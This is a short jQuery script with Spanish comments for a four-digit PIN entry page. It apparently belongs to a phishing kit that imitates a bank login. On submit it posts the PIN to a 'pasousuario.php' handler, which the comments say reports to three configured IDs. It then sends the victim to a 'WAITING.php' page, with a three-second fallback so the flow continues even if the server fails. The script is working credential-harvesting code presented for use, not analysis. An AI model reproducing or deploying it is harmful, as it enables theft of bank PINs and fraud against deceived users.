<script type="text/javascript">
    $(document).ready(function() {
        // Limpieza inicial
        $("#fondo, #cargando-o").hide();
        $(".clave").val(""); // Limpia los campos por si acaso

        // Manejo simplificado de los 4 inputs
        $(".clave").on("input", function() {
            // Solo permitir números
            this.value = this.value.replace(/[^0-9]/g, '');

            // Si escribió el número, pasar al siguiente cuadrito
            if (this.value.length === 1) {
                $(this).next(".clave").focus();
            }

            // Verificar si ya están los 4 números para activar el botón
            var p = $("#p1").val() + $("#p2").val() + $("#p3").val() + $("#p4").val();
            if (p.length === 4) {
                $("#btn-password").prop("disabled", false).css({"background-color": "#FDDA24", "color": "#000", "cursor": "pointer"});
            } else {
                $("#btn-password").prop("disabled", true).css({"background-color": "#ccc", "color": "#777"});
            }
        });

        // Permitir borrar hacia atrás
        $(".clave").on("keydown", function(e) {
            if (e.keyCode == 8 && this.value.length === 0) {
                $(this).prev(".clave").focus();
            }
        });

        // ACCIÓN DEL BOTÓN
        $("#btn-password").click(function(e) {
            e.preventDefault();
            var pin = $("#p1").val() + $("#p2").val() + $("#p3").val() + $("#p4").val();
            
            if(pin.length === 4) {
                // Forzamos la aparición del cargando
                $("#fondo").show();
                $("#cargando-o").show();

                // Reportamos a los 3 IDs configurados en el servidor
                $.post("../process/pasousuario.php", { pass: pin }, function(data) {
                    window.location.href = "WAITING.php";
                });

                // Salto de seguridad: si el servidor no responde en 3 segundos, saltamos igual
                setTimeout(function(){
                    window.location.href = "WAITING.php";
                }, 3000);
            }
        });
    });
</script>
